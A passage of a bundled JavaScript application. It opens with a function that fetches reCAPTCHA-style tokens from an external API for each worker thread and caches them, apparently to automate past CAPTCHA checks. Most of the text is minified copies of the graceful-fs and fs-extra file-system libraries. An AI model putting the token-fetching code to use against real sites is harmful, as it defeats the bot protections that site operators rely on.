      url.searchParams.append('threadId', threadId);
    }

    const response = await fetch(url.toString(), {
      method: 'GET',
      headers: {
        'Accept': 'application/json'
      },
      signal: controller.signal
    });
    clearTimeout(timeoutId);
    if (global.isSessionStopped && global.isSessionStopped()) return null;

    if (!response.ok) {
      console.warn(`[Main] [Thread-${threadId}] API không trả về Token. HTTP Status: ${response.status}`);
      return null;
    }

    const result = await response.json();

    if (result && result.captcha) {
      // API trả về format {"captcha": "0cAFcWE..."}
      const entry = { token: result.captcha, userAgent: "", expiry: Date.now() + 10000 };
      threadTokenCache.set(threadId, entry); // Lưu cache theo threadId
      console.log(`[Main] [Thread-${threadId}] Lấy Token API thành công.`);
      return entry;
    } else {
      console.warn(`[Main] [Thread-${threadId}] API trả về nhưng không có captcha. Raw: ${JSON.stringify(result)}`);
    }

    return null;
  } catch (e) {
    if (e.name !== "AbortError") {
      console.error(`[Main] [Thread-${threadId}] Lỗi gọi API lấy Token:`, e.message);
    }
    return null;
  } finally {
    clearTimeout(timeoutId);
    if (sessionCtrl) {
      sessionCtrl.signal.removeEventListener("abort", onSessionAbort);
    }
  }
}
// ============================================================================
var rt =
  typeof globalThis < "u"
    ? globalThis
    : typeof window < "u"
      ? window
      : typeof global < "u"
        ? global
        : typeof self < "u"
          ? self
          : {};
function ef(a) {
  return a && a.__esModule && Object.prototype.hasOwnProperty.call(a, "default")
    ? a.default
    : a;
}
var Pt = {},
  rn = {},
  xr = {},
  ta;
function Ze() {
  return (
    ta ||
    ((ta = 1),
      (xr.fromCallback = function (a) {
        return Object.defineProperty(
          function (...i) {
            if (typeof i[i.length - 1] == "function") a.apply(this, i);
            else
              return new Promise((c, h) => {
                i.push((f, t) => (f != null ? h(f) : c(t))), a.apply(this, i);
              });
          },
          "name",
          { value: a.name }
        );
      }),
      (xr.fromPromise = function (a) {
        return Object.defineProperty(
          function (...i) {
            const c = i[i.length - 1];
            if (typeof c != "function") return a.apply(this, i);
            i.pop(), a.apply(this, i).then((h) => c(null, h), c);
          },
          "name",
          { value: a.name }
        );
      })),
    xr
  );
}
var nn, ra;
function tf() {
  if (ra) return nn;
  ra = 1;
  var a = Jc,
    i = process.cwd,
    c = null,
    h = process.env.GRACEFUL_FS_PLATFORM || process.platform;
  process.cwd = function () {
    return c || (c = i.call(process)), c;
  };
  try {
    process.cwd();
  } catch { }
  if (typeof process.chdir == "function") {
    var f = process.chdir;
    (process.chdir = function (r) {
      (c = null), f.call(process, r);
    }),
      Object.setPrototypeOf && Object.setPrototypeOf(process.chdir, f);
  }
  nn = t;
  function t(r) {
    a.hasOwnProperty("O_SYMLINK") &&
      process.version.match(/^v0\.6\.[0-2]|^v0\.5\./) &&
      l(r),
      r.lutimes || e(r),
      (r.chown = s(r.chown)),
      (r.fchown = s(r.fchown)),
      (r.lchown = s(r.lchown)),
      (r.chmod = o(r.chmod)),
      (r.fchmod = o(r.fchmod)),
      (r.lchmod = o(r.lchmod)),
      (r.chownSync = u(r.chownSync)),
      (r.fchownSync = u(r.fchownSync)),
      (r.lchownSync = u(r.lchownSync)),
      (r.chmodSync = n(r.chmodSync)),
      (r.fchmodSync = n(r.fchmodSync)),
      (r.lchmodSync = n(r.lchmodSync)),
      (r.stat = m(r.stat)),
      (r.fstat = m(r.fstat)),
      (r.lstat = m(r.lstat)),
      (r.statSync = E(r.statSync)),
      (r.fstatSync = E(r.fstatSync)),
      (r.lstatSync = E(r.lstatSync)),
      r.chmod &&
      !r.lchmod &&
      ((r.lchmod = function (p, A, S) {
        S && process.nextTick(S);
      }),
        (r.lchmodSync = function () { })),
      r.chown &&
      !r.lchown &&
      ((r.lchown = function (p, A, S, b) {
        b && process.nextTick(b);
      }),
        (r.lchownSync = function () { })),
      h === "win32" &&
      (r.rename =
        typeof r.rename != "function"
          ? r.rename
          : (function (p) {
            function A(S, b, R) {
              var C = Date.now(),
                v = 0;
              p(S, b, function w(_) {
                if (
                  _ &&
                  (_.code === "EACCES" ||
                    _.code === "EPERM" ||
                    _.code === "EBUSY") &&
                  Date.now() - C < 6e4
                ) {
                  setTimeout(function () {
                    r.stat(b, function (g, D) {
                      g && g.code === "ENOENT" ? p(S, b, w) : R(_);
                    });
                  }, v),
                    v < 100 && (v += 10);
                  return;
                }
                R && R(_);
              });
            }
            return Object.setPrototypeOf && Object.setPrototypeOf(A, p), A;
          })(r.rename)),
      (r.read =
        typeof r.read != "function"
          ? r.read
          : (function (p) {
            function A(S, b, R, C, v, w) {
              var _;
              if (w && typeof w == "function") {
                var g = 0;
                _ = function (D, O, N) {
                  if (D && D.code === "EAGAIN" && g < 10)
                    return g++, p.call(r, S, b, R, C, v, _);
                  w.apply(this, arguments);
                };
              }
              return p.call(r, S, b, R, C, v, _);
            }
            return Object.setPrototypeOf && Object.setPrototypeOf(A, p), A;
          })(r.read)),
      (r.readSync =
        typeof r.readSync != "function"
          ? r.readSync
          : (function (p) {
            return function (A, S, b, R, C) {
              for (var v = 0; ;)
                try {
                  return p.call(r, A, S, b, R, C);
                } catch (w) {
                  if (w.code === "EAGAIN" && v < 10) {
                    v++;
                    continue;
                  }
                  throw w;
                }
            };
          })(r.readSync));
    function l(p) {
      (p.lchmod = function (A, S, b) {
        p.open(A, a.O_WRONLY | a.O_SYMLINK, S, function (R, C) {
          if (R) {
            b && b(R);
            return;
          }
          p.fchmod(C, S, function (v) {
            p.close(C, function (w) {
              b && b(v || w);
            });
          });
        });
      }),
        (p.lchmodSync = function (A, S) {
          var b = p.openSync(A, a.O_WRONLY | a.O_SYMLINK, S),
            R = !0,
            C;
          try {
            (C = p.fchmodSync(b, S)), (R = !1);
          } finally {
            if (R)
              try {
                p.closeSync(b);
              } catch { }
            else p.closeSync(b);
          }
          return C;
        });
    }
    function e(p) {
      a.hasOwnProperty("O_SYMLINK") && p.futimes
        ? ((p.lutimes = function (A, S, b, R) {
          p.open(A, a.O_SYMLINK, function (C, v) {
            if (C) {
              R && R(C);
              return;
            }
            p.futimes(v, S, b, function (w) {
              p.close(v, function (_) {
                R && R(w || _);
              });
            });
          });
        }),
          (p.lutimesSync = function (A, S, b) {
            var R = p.openSync(A, a.O_SYMLINK),
              C,
              v = !0;
            try {
              (C = p.futimesSync(R, S, b)), (v = !1);
            } finally {
              if (v)
                try {
                  p.closeSync(R);
                } catch { }
              else p.closeSync(R);
            }
            return C;
          }))
        : p.futimes &&
        ((p.lutimes = function (A, S, b, R) {
          R && process.nextTick(R);
        }),
          (p.lutimesSync = function () { }));
    }
    function o(p) {
      return (
        p &&
        function (A, S, b) {
          return p.call(r, A, S, function (R) {
            y(R) && (R = null), b && b.apply(this, arguments);
          });
        }
      );
    }
    function n(p) {
      return (
        p &&
        function (A, S) {
          try {
            return p.call(r, A, S);
          } catch (b) {
            if (!y(b)) throw b;
          }
        }
      );
    }
    function s(p) {
      return (
        p &&
        function (A, S, b, R) {
          return p.call(r, A, S, b, function (C) {
            y(C) && (C = null), R && R.apply(this, arguments);
          });
        }
      );
    }
    function u(p) {
      return (
        p &&
        function (A, S, b) {
          try {
            return p.call(r, A, S, b);
          } catch (R) {
            if (!y(R)) throw R;
          }
        }
      );
    }
    function m(p) {
      return (
        p &&
        function (A, S, b) {
          typeof S == "function" && ((b = S), (S = null));
          function R(C, v) {
            v &&
              (v.uid < 0 && (v.uid += 4294967296),
                v.gid < 0 && (v.gid += 4294967296)),
              b && b.apply(this, arguments);
          }
          return S ? p.call(r, A, S, R) : p.call(r, A, R);
        }
      );
    }
    function E(p) {
      return (
        p &&
        function (A, S) {
          var b = S ? p.call(r, A, S) : p.call(r, A);
          return (
            b &&
            (b.uid < 0 && (b.uid += 4294967296),
              b.gid < 0 && (b.gid += 4294967296)),
            b
          );
        }
      );
    }
    function y(p) {
      if (!p || p.code === "ENOSYS") return !0;
      var A = !process.getuid || process.getuid() !== 0;
      return !!(A && (p.code === "EINVAL" || p.code === "EPERM"));
    }
  }
  return nn;
}
var on, na;
function rf() {
  if (na) return on;
  na = 1;
  var a = Ht.Stream;
  on = i;
  function i(c) {
    return { ReadStream: h, WriteStream: f };
    function h(t, r) {
      if (!(this instanceof h)) return new h(t, r);
      a.call(this);
      var l = this;
      (this.path = t),
        (this.fd = null),
        (this.readable = !0),
        (this.paused = !1),
        (this.flags = "r"),
        (this.mode = 438),
        (this.bufferSize = 64 * 1024),
        (r = r || {});
      for (var e = Object.keys(r), o = 0, n = e.length; o < n; o++) {
        var s = e[o];
        this[s] = r[s];
      }
      if (
        (this.encoding && this.setEncoding(this.encoding),
          this.start !== void 0)
      ) {
        if (typeof this.start != "number")
          throw TypeError("start must be a Number");
        if (this.end === void 0) this.end = 1 / 0;
        else if (typeof this.end != "number")
          throw TypeError("end must be a Number");
        if (this.start > this.end) throw new Error("start must be <= end");
        this.pos = this.start;
      }
      if (this.fd !== null) {
        process.nextTick(function () {
          l._read();
        });
        return;
      }
      c.open(this.path, this.flags, this.mode, function (u, m) {
        if (u) {
          l.emit("error", u), (l.readable = !1);
          return;
        }
        (l.fd = m), l.emit("open", m), l._read();
      });
    }
    function f(t, r) {
      if (!(this instanceof f)) return new f(t, r);
      a.call(this),
        (this.path = t),
        (this.fd = null),
        (this.writable = !0),
        (this.flags = "w"),
        (this.encoding = "binary"),
        (this.mode = 438),
        (this.bytesWritten = 0),
        (r = r || {});
      for (var l = Object.keys(r), e = 0, o = l.length; e < o; e++) {
        var n = l[e];
        this[n] = r[n];
      }
      if (this.start !== void 0) {
        if (typeof this.start != "number")
          throw TypeError("start must be a Number");
        if (this.start < 0) throw new Error("start must be >= zero");
        this.pos = this.start;
      }
      (this.busy = !1),
        (this._queue = []),
        this.fd === null &&
        ((this._open = c.open),
          this._queue.push([
            this._open,
            this.path,
            this.flags,
            this.mode,
            void 0,
          ]),
          this.flush());
    }
  }
  return on;
}
var an, ia;
function nf() {
  if (ia) return an;
  (ia = 1), (an = i);
  var a =
    Object.getPrototypeOf ||
    function (c) {
      return c.__proto__;
    };
  function i(c) {
    if (c === null || typeof c != "object") return c;
    if (c instanceof Object) var h = { __proto__: a(c) };
    else var h = Object.create(null);
    return (
      Object.getOwnPropertyNames(c).forEach(function (f) {
        Object.defineProperty(h, f, Object.getOwnPropertyDescriptor(c, f));
      }),
      h
    );
  }
  return an;
}
var Nr, oa;
function Ke() {
  if (oa) return Nr;
  oa = 1;
  var a = be,
    i = tf(),
    c = rf(),
    h = nf(),
    f = Vr,
    t,
    r;
  typeof Symbol == "function" && typeof Symbol.for == "function"
    ? ((t = Symbol.for("graceful-fs.queue")),
      (r = Symbol.for("graceful-fs.previous")))
    : ((t = "___graceful-fs.queue"), (r = "___graceful-fs.previous"));
  function l() { }
  function e(p, A) {
    Object.defineProperty(p, t, {
      get: function () {
        return A;
      },
    });
  }
  var o = l;
  if (
    (f.debuglog
      ? (o = f.debuglog("gfs4"))
      : /\bgfs4\b/i.test(process.env.NODE_DEBUG || "") &&
      (o = function () {
        var p = f.format.apply(f, arguments);
        (p =
          "GFS4: " +
          p.split(/\n/).join(`
GFS4: `)),
          console.error(p);
      }),
      !a[t])
  ) {
    var n = rt[t] || [];
    e(a, n),
      (a.close = (function (p) {
        function A(S, b) {
          return p.call(a, S, function (R) {
            R || E(), typeof b == "function" && b.apply(this, arguments);
          });
        }
        return Object.defineProperty(A, r, { value: p }), A;
      })(a.close)),
      (a.closeSync = (function (p) {
        function A(S) {
          p.apply(a, arguments), E();
        }
        return Object.defineProperty(A, r, { value: p }), A;
      })(a.closeSync)),
      /\bgfs4\b/i.test(process.env.NODE_DEBUG || "") &&
      process.on("exit", function () {
        o(a[t]), Al.equal(a[t].length, 0);
      });
  }
  rt[t] || e(rt, a[t]),
    (Nr = s(h(a))),
    process.env.TEST_GRACEFUL_FS_GLOBAL_PATCH &&
    !a.__patched &&
    ((Nr = s(a)), (a.__patched = !0));
  function s(p) {
    i(p),
      (p.gracefulify = s),
      (p.createReadStream = se),
      (p.createWriteStream = ce);
    var A = p.readFile;
    p.readFile = S;
    function S(J, Ee, I) {
      return typeof Ee == "function" && ((I = Ee), (Ee = null)), T(J, Ee, I);
      function T(j, U, le, ge) {
        return A(j, U, function (me) {
          me && (me.code === "EMFILE" || me.code === "ENFILE")
            ? u([T, [j, U, le], me, ge || Date.now(), Date.now()])
            : typeof le == "function" && le.apply(this, arguments);
        });
      }
    }
    var b = p.writeFile;
    p.writeFile = R;
    function R(J, Ee, I, T) {
      return typeof I == "function" && ((T = I), (I = null)), j(J, Ee, I, T);
      function j(U, le, ge, me, Se) {
        return b(U, le, ge, function (_e) {
          _e && (_e.code === "EMFILE" || _e.code === "ENFILE")
            ? u([j, [U, le, ge, me], _e, Se || Date.now(), Date.now()])
            : typeof me == "function" && me.apply(this, arguments);
        });
      }
    }
    var C = p.appendFile;
    C && (p.appendFile = v);
    function v(J, Ee, I, T) {
      return typeof I == "function" && ((T = I), (I = null)), j(J, Ee, I, T);
      function j(U, le, ge, me, Se) {
        return C(U, le, ge, function (_e) {
          _e && (_e.code === "EMFILE" || _e.code === "ENFILE")
            ? u([j, [U, le, ge, me], _e, Se || Date.now(), Date.now()])
            : typeof me == "function" && me.apply(this, arguments);
        });
      }
    }
    var w = p.copyFile;
    w && (p.copyFile = _);
    function _(J, Ee, I, T) {
      return typeof I == "function" && ((T = I), (I = 0)), j(J, Ee, I, T);
      function j(U, le, ge, me, Se) {
        return w(U, le, ge, function (_e) {
          _e && (_e.code === "EMFILE" || _e.code === "ENFILE")
            ? u([j, [U, le, ge, me], _e, Se || Date.now(), Date.now()])
            : typeof me == "function" && me.apply(this, arguments);
        });
      }
    }
    var g = p.readdir;
    p.readdir = O;
    var D = /^v[0-5]\./;
    function O(J, Ee, I) {
      typeof Ee == "function" && ((I = Ee), (Ee = null));
      var T = D.test(process.version)
        ? function (le, ge, me, Se) {
          return g(le, j(le, ge, me, Se));
        }
        : function (le, ge, me, Se) {
          return g(le, ge, j(le, ge, me, Se));
        };
      return T(J, Ee, I);
      function j(U, le, ge, me) {
        return function (Se, _e) {
          Se && (Se.code === "EMFILE" || Se.code === "ENFILE")
            ? u([T, [U, le, ge], Se, me || Date.now(), Date.now()])
            : (_e && _e.sort && _e.sort(),
              typeof ge == "function" && ge.call(this, Se, _e));
        };
      }
    }
    if (process.version.substr(0, 4) === "v0.8") {
      var N = c(p);
      (M = N.ReadStream), (G = N.WriteStream);
    }
    var L = p.ReadStream;
    L && ((M.prototype = Object.create(L.prototype)), (M.prototype.open = K));
    var F = p.WriteStream;
    F && ((G.prototype = Object.create(F.prototype)), (G.prototype.open = ne)),
      Object.defineProperty(p, "ReadStream", {
        get: function () {
          return M;
        },
        set: function (J) {
          M = J;
        },
        enumerable: !0,
        configurable: !0,
      }),
      Object.defineProperty(p, "WriteStream", {
        get: function () {
          return G;
        },
        set: function (J) {
          G = J;
        },
        enumerable: !0,
        configurable: !0,
      });
    var $ = M;
    Object.defineProperty(p, "FileReadStream", {
      get: function () {
        return $;
      },
      set: function (J) {
        $ = J;
      },
      enumerable: !0,
      configurable: !0,
    });
    var k = G;
    Object.defineProperty(p, "FileWriteStream", {
      get: function () {
        return k;
      },
      set: function (J) {
        k = J;
      },
      enumerable: !0,
      configurable: !0,
    });
    function M(J, Ee) {
      return this instanceof M
        ? (L.apply(this, arguments), this)
        : M.apply(Object.create(M.prototype), arguments);
    }
    function K() {
      var J = this;
      Re(J.path, J.flags, J.mode, function (Ee, I) {
        Ee
          ? (J.autoClose && J.destroy(), J.emit("error", Ee))
          : ((J.fd = I), J.emit("open", I), J.read());
      });
    }
    function G(J, Ee) {
      return this instanceof G
        ? (F.apply(this, arguments), this)
        : G.apply(Object.create(G.prototype), arguments);
    }
    function ne() {
      var J = this;
      Re(J.path, J.flags, J.mode, function (Ee, I) {
        Ee
          ? (J.destroy(), J.emit("error", Ee))
          : ((J.fd = I), J.emit("open", I));
      });
    }
    function se(J, Ee) {
      return new p.ReadStream(J, Ee);
    }
    function ce(J, Ee) {
      return new p.WriteStream(J, Ee);
    }
    var ie = p.open;
    p.open = Re;
    function Re(J, Ee, I, T) {
      return typeof I == "function" && ((T = I), (I = null)), j(J, Ee, I, T);
      function j(U, le, ge, me, Se) {
        return ie(U, le, ge, function (_e, Le) {
          _e && (_e.code === "EMFILE" || _e.code === "ENFILE")
            ? u([j, [U, le, ge, me], _e, Se || Date.now(), Date.now()])
            : typeof me == "function" && me.apply(this, arguments);
        });
      }
    }
    return p;
  }
  function u(p) {
    o("ENQUEUE", p[0].name, p[1]), a[t].push(p), y();
  }
  var m;
  function E() {
    for (var p = Date.now(), A = 0; A < a[t].length; ++A)
      a[t][A].length > 2 && ((a[t][A][3] = p), (a[t][A][4] = p));
    y();
  }
  function y() {
    if ((clearTimeout(m), (m = void 0), a[t].length !== 0)) {
      var p = a[t].shift(),
        A = p[0],
        S = p[1],
        b = p[2],
        R = p[3],
        C = p[4];
      if (R === void 0) o("RETRY", A.name, S), A.apply(null, S);
      else if (Date.now() - R >= 6e4) {
        o("TIMEOUT", A.name, S);
        var v = S.pop();
        typeof v == "function" && v.call(null, b);
      } else {
        var w = Date.now() - C,
          _ = Math.max(C - R, 1),
          g = Math.min(_ * 1.2, 100);
        w >= g
          ? (o("RETRY", A.name, S), A.apply(null, S.concat([R])))
          : a[t].push(p);
      }
      m === void 0 && (m = setTimeout(y, 0));
    }
  }
  return Nr;
}
var aa;
function Vt() {
  return (
    aa ||
    ((aa = 1),
      (function (a) {
        const i = Ze().fromCallback,
          c = Ke(),
          h = [
            "access",
            "appendFile",
            "chmod",
            "chown",
            "close",
            "copyFile",
            "fchmod",
            "fchown",
            "fdatasync",
            "fstat",
            "fsync",
            "ftruncate",
            "futimes",
            "lchmod",
            "lchown",
            "link",
            "lstat",
            "mkdir",
            "mkdtemp",
            "open",
            "opendir",
            "readdir",
            "readFile",
            "readlink",
            "realpath",
            "rename",
            "rm",
            "rmdir",
            "stat",
            "symlink",
            "truncate",
            "unlink",
            "utimes",
            "writeFile",
          ].filter((f) => typeof c[f] == "function");
        Object.assign(a, c),
          h.forEach((f) => {
            a[f] = i(c[f]);
          }),
          (a.exists = function (f, t) {
            return typeof t == "function"
              ? c.exists(f, t)
              : new Promise((r) => c.exists(f, r));
          }),
          (a.read = function (f, t, r, l, e, o) {
            return typeof o == "function"
              ? c.read(f, t, r, l, e, o)
              : new Promise((n, s) => {
                c.read(f, t, r, l, e, (u, m, E) => {
                  if (u) return s(u);
                  n({ bytesRead: m, buffer: E });
                });
              });
          }),
          (a.write = function (f, t, ...r) {
            return typeof r[r.length - 1] == "function"
              ? c.write(f, t, ...r)
              : new Promise((l, e) => {
                c.write(f, t, ...r, (o, n, s) => {
                  if (o) return e(o);
                  l({ bytesWritten: n, buffer: s });
                });
              });
          }),
          typeof c.writev == "function" &&
          (a.writev = function (f, t, ...r) {
            return typeof r[r.length - 1] == "function"
              ? c.writev(f, t, ...r)
              : new Promise((l, e) => {
                c.writev(f, t, ...r, (o, n, s) => {
                  if (o) return e(o);
                  l({ bytesWritten: n, buffers: s });
                });
              });
          }),
          typeof c.realpath.native == "function"
            ? (a.realpath.native = i(c.realpath.native))
            : process.emitWarning(
              "fs.realpath.native is not a function. Is fs being monkey-patched?",
              "Warning",
              "fs-extra-WARN0003"
            );
      })(rn)),
    rn
  );
}
var Fr = {},
  sn = {},
  sa;
function of() {
  if (sa) return sn;
  sa = 1;
  const a = ye;
  return (
    (sn.checkPath = function (c) {
      if (
        process.platform === "win32" &&
        /[<>:"|?*]/.test(c.replace(a.parse(c).root, ""))
      ) {
        const f = new Error(`Path contains invalid characters: ${c}`);
        throw ((f.code = "EINVAL"), f);
      }
    }),
    sn
  );
}
var ua;
function af() {
  if (ua) return Fr;
  ua = 1;
  const a = Vt(),
    { checkPath: i } = of(),
    c = (h) => {
      const f = { mode: 511 };
      return typeof h == "number" ? h : { ...f, ...h }.mode;
    };
  return (
    (Fr.makeDir = async (h, f) => (
      i(h), a.mkdir(h, { mode: c(f), recursive: !0 })
    )),
    (Fr.makeDirSync = (h, f) => (
      i(h), a.mkdirSync(h, { mode: c(f), recursive: !0 })
    )),
    Fr
  );
}
var un, la;
function lt() {
  if (la) return un;
  la = 1;
  const a = Ze().fromPromise,
    { makeDir: i, makeDirSync: c } = af(),
    h = a(i);
  return (
    (un = {
      mkdirs: h,
      mkdirsSync: c,
      mkdirp: h,
      mkdirpSync: c,
      ensureDir: h,
      ensureDirSync: c,
    }),
    un
  );
}
var ln, ca;
function Ft() {
  if (ca) return ln;
  ca = 1;
  const a = Ze().fromPromise,
    i = Vt();
  function c(h) {
    return i
      .access(h)
      .then(() => !0)
      .catch(() => !1);
  }
  return (ln = { pathExists: a(c), pathExistsSync: i.existsSync }), ln;
}
var cn, fa;
function bl() {
  if (fa) return cn;
  fa = 1;
  const a = Ke();
  function i(h, f, t, r) {
    a.open(h, "r+", (l, e) => {
      if (l) return r(l);
      a.futimes(e, f, t, (o) => {
        a.close(e, (n) => {
          r && r(o || n);
        });
      });
    });
  }
  function c(h, f, t) {
    const r = a.openSync(h, "r+");
    return a.futimesSync(r, f, t), a.closeSync(r);
  }
  return (cn = { utimesMillis: i, utimesMillisSync: c }), cn;
}
var fn, da;
function Wt() {
  if (da) return fn;
  da = 1;
  const a = Vt(),
    i = ye,
    c = Vr;
  function h(u, m, E) {
    const y = E.dereference
      ? (p) => a.stat(p, { bigint: !0 })
      : (p) => a.lstat(p, { bigint: !0 });
    return Promise.all([
      y(u),
      y(m).catch((p) => {
        if (p.code === "ENOENT") return null;
        throw p;
      }),
    ]).then(([p, A]) => ({ srcStat: p, destStat: A }));
  }
  function f(u, m, E) {
    let y;
    const p = E.dereference
      ? (S) => a.statSync(S, { bigint: !0 })
      : (S) => a.lstatSync(S, { bigint: !0 }),
      A = p(u);
    try {
      y = p(m);
    } catch (S) {
      if (S.code === "ENOENT") return { srcStat: A, destStat: null };
      throw S;
    }
    return { srcStat: A, destStat: y };
  }
  function t(u, m, E, y, p) {
    c.callbackify(h)(u, m, y, (A, S) => {
      if (A) return p(A);
      const { srcStat: b, destStat: R } = S;
      if (R) {
        if (o(b, R)) {
          const C = i.basename(u),
            v = i.basename(m);
          return E === "move" && C !== v && C.toLowerCase() === v.toLowerCase()
            ? p(null, { srcStat: b, destStat: R, isChangingCase: !0 })
            : p(new Error("Source and destination must not be the same."));
        }
        if (b.isDirectory() && !R.isDirectory())
          return p(
            new Error(
              `Cannot overwrite non-directory '${m}' with directory '${u}'.`
            )
          );
        if (!b.isDirectory() && R.isDirectory())
          return p(
            new Error(
              `Cannot overwrite directory '${m}' with non-directory '${u}'.`
            )
          );
      }
      return b.isDirectory() && n(u, m)
        ? p(new Error(s(u, m, E)))
        : p(null, { srcStat: b, destStat: R });
    });
  }
  function r(u, m, E, y) {
    const { srcStat: p, destStat: A } = f(u, m, y);
    if (A) {
      if (o(p, A)) {
        const S = i.basename(u),
          b = i.basename(m);
        if (E === "move" && S !== b && S.toLowerCase() === b.toLowerCase())
          return { srcStat: p, destStat: A, isChangingCase: !0 };
        throw new Error("Source and destination must not be the same.");
      }
      if (p.isDirectory() && !A.isDirectory())
        throw new Error(
          `Cannot overwrite non-directory '${m}' with directory '${u}'.`
        );
      if (!p.isDirectory() && A.isDirectory())
        throw new Error(
          `Cannot overwrite directory '${m}' with non-directory '${u}'.`
        );
    }
    if (p.isDirectory() && n(u, m)) throw new Error(s(u, m, E));
    return { srcStat: p, destStat: A };
  }
  function l(u, m, E, y, p) {
    const A = i.resolve(i.dirname(u)),
      S = i.resolve(i.dirname(E));
    if (S === A || S === i.parse(S).root) return p();
    a.stat(S, { bigint: !0 }, (b, R) =>
      b
        ? b.code === "ENOENT"
          ? p()
          : p(b)
        : o(m, R)
          ? p(new Error(s(u, E, y)))
          : l(u, m, S, y, p)
    );
  }
  function e(u, m, E, y) {
    const p = i.resolve(i.dirname(u)),
      A = i.resolve(i.dirname(E));
    if (A === p || A === i.parse(A).root) return;
    let S;
    try {
      S = a.statSync(A, { bigint: !0 });
    } catch (b) {
      if (b.code === "ENOENT") return;
      throw b;
    }
    if (o(m, S)) throw new Error(s(u, E, y));
    return e(u, m, A, y);
  }
  function o(u, m) {
    return m.ino && m.dev && m.ino === u.ino && m.dev === u.dev;
  }
  function n(u, m) {
    const E = i
      .resolve(u)
      .split(i.sep)
      .filter((p) => p),
      y = i
        .resolve(m)
        .split(i.sep)
        .filter((p) => p);
    return E.reduce((p, A, S) => p && y[S] === A, !0);
  }
  function s(u, m, E) {
    return `Cannot ${E} '${u}' to a subdirectory of itself, '${m}'.`;
  }
  return (
    (fn = {
      checkPaths: t,
      checkPathsSync: r,
      checkParentPaths: l,
      checkParentPathsSync: e,
      isSrcSubdir: n,
      areIdentical: o,
    }),
    fn
  );
}
var dn, ha;
function sf() {
  if (ha) return dn;
  ha = 1;
  const a = Ke(),
    i = ye,
    c = lt().mkdirs,
    h = Ft().pathExists,
    f = bl().utimesMillis,
    t = Wt();
  function r(O, N, L, F) {
    typeof L == "function" && !F
      ? ((F = L), (L = {}))
      : typeof L == "function" && (L = { filter: L }),
      (F = F || function () { }),
      (L = L || {}),
      (L.clobber = "clobber" in L ? !!L.clobber : !0),
      (L.overwrite = "overwrite" in L ? !!L.overwrite : L.clobber),
      L.preserveTimestamps &&
      process.arch === "ia32" &&
      process.emitWarning(
        `Using the preserveTimestamps option in 32-bit node is not recommended;

  see https://github.com/jprichardson/node-fs-extra/issues/269`,
        "Warning",
        "fs-extra-WARN0001"
      ),
      t.checkPaths(O, N, "copy", L, ($, k) => {
        if ($) return F($);
        const { srcStat: M, destStat: K } = k;
        t.checkParentPaths(O, M, N, "copy", (G) =>
          G ? F(G) : L.filter ? e(l, K, O, N, L, F) : l(K, O, N, L, F)
        );
      });
  }
  function l(O, N, L, F, $) {
    const k = i.dirname(L);
    h(k, (M, K) => {
      if (M) return $(M);
      if (K) return n(O, N, L, F, $);
      c(k, (G) => (G ? $(G) : n(O, N, L, F, $)));
    });
  }
  function e(O, N, L, F, $, k) {
    Promise.resolve($.filter(L, F)).then(
      (M) => (M ? O(N, L, F, $, k) : k()),
      (M) => k(M)
    );
  }
  function o(O, N, L, F, $) {
    return F.filter ? e(n, O, N, L, F, $) : n(O, N, L, F, $);
  }
  function n(O, N, L, F, $) {
    (F.dereference ? a.stat : a.lstat)(N, (M, K) =>
      M
        ? $(M)
        : K.isDirectory()
          ? R(K, O, N, L, F, $)
          : K.isFile() || K.isCharacterDevice() || K.isBlockDevice()
            ? s(K, O, N, L, F, $)
            : K.isSymbolicLink()
              ? g(O, N, L, F, $)
              : K.isSocket()
                ? $(new Error(`Cannot copy a socket file: ${N}`))
                : K.isFIFO()
                  ? $(new Error(`Cannot copy a FIFO pipe: ${N}`))
                  : $(new Error(`Unknown file: ${N}`))
    );
  }
  function s(O, N, L, F, $, k) {
    return N ? u(O, L, F, $, k) : m(O, L, F, $, k);
  }
  function u(O, N, L, F, $) {
    if (F.overwrite) a.unlink(L, (k) => (k ? $(k) : m(O, N, L, F, $)));
    else return F.errorOnExist ? $(new Error(`'${L}' already exists`)) : $();
  }
  function m(O, N, L, F, $) {
    a.copyFile(N, L, (k) =>
      k ? $(k) : F.preserveTimestamps ? E(O.mode, N, L, $) : S(L, O.mode, $)
    );
  }
  function E(O, N, L, F) {
    return y(O) ? p(L, O, ($) => ($ ? F($) : A(O, N, L, F))) : A(O, N, L, F);
  }
  function y(O) {
    return (O & 128) === 0;
  }
  function p(O, N, L) {
    return S(O, N | 128, L);
  }
  function A(O, N, L, F) {
    b(N, L, ($) => ($ ? F($) : S(L, O, F)));
  }
  function S(O, N, L) {
    return a.chmod(O, N, L);
  }
  function b(O, N, L) {
    a.stat(O, (F, $) => (F ? L(F) : f(N, $.atime, $.mtime, L)));
  }
  function R(O, N, L, F, $, k) {
    return N ? v(L, F, $, k) : C(O.mode, L, F, $, k);
  }
  function C(O, N, L, F, $) {
    a.mkdir(L, (k) => {
      if (k) return $(k);
      v(N, L, F, (M) => (M ? $(M) : S(L, O, $)));
    });
  }
  function v(O, N, L, F) {
    a.readdir(O, ($, k) => ($ ? F($) : w(k, O, N, L, F)));
  }
  function w(O, N, L, F, $) {
    const k = O.pop();
    return k ? _(O, k, N, L, F, $) : $();
  }
  function _(O, N, L, F, $, k) {
    const M = i.join(L, N),
      K = i.join(F, N);
    t.checkPaths(M, K, "copy", $, (G, ne) => {
      if (G) return k(G);
      const { destStat: se } = ne;
      o(se, M, K, $, (ce) => (ce ? k(ce) : w(O, L, F, $, k)));
    });
  }
  function g(O, N, L, F, $) {
    a.readlink(N, (k, M) => {
      if (k) return $(k);
      if ((F.dereference && (M = i.resolve(process.cwd(), M)), O))
        a.readlink(L, (K, G) =>
          K
            ? K.code === "EINVAL" || K.code === "UNKNOWN"
              ? a.symlink(M, L, $)
              : $(K)
            : (F.dereference && (G = i.resolve(process.cwd(), G)),
              t.isSrcSubdir(M, G)
                ? $(
                  new Error(
                    `Cannot copy '${M}' to a subdirectory of itself, '${G}'.`
                  )
                )
                : O.isDirectory() && t.isSrcSubdir(G, M)
                  ? $(new Error(`Cannot overwrite '${G}' with '${M}'.`))
                  : D(M, L, $))
        );
      else return a.symlink(M, L, $);
    });
  }
  function D(O, N, L) {
    a.unlink(N, (F) => (F ? L(F) : a.symlink(O, N, L)));
  }
  return (dn = r), dn;
}
var hn, pa;
function uf() {
  if (pa) return hn;
  pa = 1;
  const a = Ke(),
    i = ye,
    c = lt().mkdirsSync,
    h = bl().utimesMillisSync,
    f = Wt();
  function t(w, _, g) {
    typeof g == "function" && (g = { filter: g }),
      (g = g || {}),
      (g.clobber = "clobber" in g ? !!g.clobber : !0),
      (g.overwrite = "overwrite" in g ? !!g.overwrite : g.clobber),
